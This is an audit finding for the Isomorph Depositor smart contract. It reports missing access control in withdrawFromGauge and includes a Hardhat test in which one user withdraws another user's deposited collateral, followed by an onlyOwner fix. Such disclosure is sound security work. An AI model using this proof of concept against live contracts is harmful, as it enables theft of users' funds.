# Lack of access control in withdrawFromGauge allows any user to steal collateral

## Summary
Function `withdrawFromGauge` in `Depositor` contract transfers the `pooledTokens` associated to an `NFTId`. It does not have any kind of access control, so any user can pass any `NFTId` to the function and steal the collateral deposited by another user.

## Vulnerability Detail
When a user deposits through his Depositor contract by calling `depositToGauge`, it transfers to the gauge the amount to be deposited and calls the corresponding DepositorReceipt to mint an NFT that represents the user deposit.	This function has an `onlyOwner()` modifier meaning it can be only called by the owner of the contract. 
But when the user wants to withdraw from the gauge by calling `withdrawFromGauge` (directly or through calls to `partialWithdrawFromGauge` or `multiWithdrawFromGauge`) 
https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/Depositor.sol#L119-L127
there is no owner check, meaning any user can call the function, burn the NFT and receive the amount deposited corresponding to the receipt. The only requirement is that the depositor must be approved by the user as a spender of the NFT receipts (which could be backrun by a malicious user).

## Impact
High impact, any user can withdraw any token from a depositor, which has been approved by the owner to spend his NFT receipts.

## Code Snippet
The following test, added in the [Depositor.js](https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/test/Unit/Depositor.js) test file, shows how `alice` can withdraw `owner`'s token and receive all the pooled tokens from that receipt.
```solidity
it("Should withdraw from gauge with wrong user call", async function (){
	//setup deposit first

	AMMToken.approve(depositor.address, amount)

	// Owner deposits to gauge
	await depositor.connect(owner).depositToGauge(amount)
	rewards_address = await gauge.FakeRewards()

	before_NFT_owner = await depositReceipt.ownerOf(NFT_id)
	// We check NFT_id belongs to owner
	expect(before_NFT_owner).to.equal(owner.address)

	// We record the balance of tokens Alice has
	before_alice_tokens = await AMMToken.balanceOf(alice.address)

	// Owner approves depositor to use NFT_id 
	await depositReceipt.connect(owner).approve(depositor.address, NFT_id)
	// But Alice is the one calling withdrawFromGauge
	await depositor.connect(alice).withdrawFromGauge(NFT_id, [rewards_address])            

	// We record the balance of tokens Alice has after withdrawing another user's token
	after_alice_tokens = await AMMToken.balanceOf(alice.address)

	// Then we check the balance of Alice has increased exactly 'amount'
	expect(after_alice_tokens).to.equal(before_alice_tokens.add(amount))

});
```

## Tool used

Forge tests and manual Review

## Recommendation
Add an `onlyOwner` modifier to `withdrawFromGauge`.
